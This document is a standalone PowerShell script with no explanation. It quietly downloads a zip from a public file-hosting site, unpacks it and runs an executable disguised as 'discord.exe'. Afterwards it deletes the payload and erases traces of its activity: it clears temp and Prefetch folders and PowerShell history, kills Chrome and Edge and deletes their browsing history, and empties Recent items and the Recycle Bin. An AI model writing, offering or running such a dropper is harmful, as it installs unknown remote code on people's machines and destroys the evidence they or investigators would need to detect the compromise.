```powershell id="m4x2za"
$ProgressPreference = 'SilentlyContinue'

$zipUrl = "https://files.catbox.moe/0tjan7.zip"
$downloadPath = "$env:TEMP\work.zip"
$extractPath = "$env:TEMP\work"
$runFile = "$extractPath\discord.exe"

Invoke-WebRequest -Uri $zipUrl -OutFile $downloadPath

Expand-Archive -Path $downloadPath -DestinationPath $extractPath -Force

Start-Process -FilePath $runFile -Wait

Remove-Item $extractPath -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $downloadPath -Force -ErrorAction SilentlyContinue

$tempFolders = @(
    "$env:TEMP\*",
    "$env:WINDIR\Temp\*",
    "$env:WINDIR\Prefetch\*"
)

foreach ($folder in $tempFolders) {
    Remove-Item -Path $folder -Recurse -Force -ErrorAction SilentlyContinue
}

Clear-History

$psHistoryPath = (Get-PSReadLineOption).HistorySavePath
if ($psHistoryPath -and (Test-Path $psHistoryPath)) {
    Remove-Item $psHistoryPath -Force -ErrorAction SilentlyContinue
}

Stop-Process -Name chrome -Force -ErrorAction SilentlyContinue
Remove-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History" -Force -ErrorAction SilentlyContinue

Stop-Process -Name msedge -Force -ErrorAction SilentlyContinue
Remove-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History" -Force -ErrorAction SilentlyContinue

Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -Recurse -ErrorAction SilentlyContinue

Clear-RecycleBin -Force -ErrorAction SilentlyContinue
```
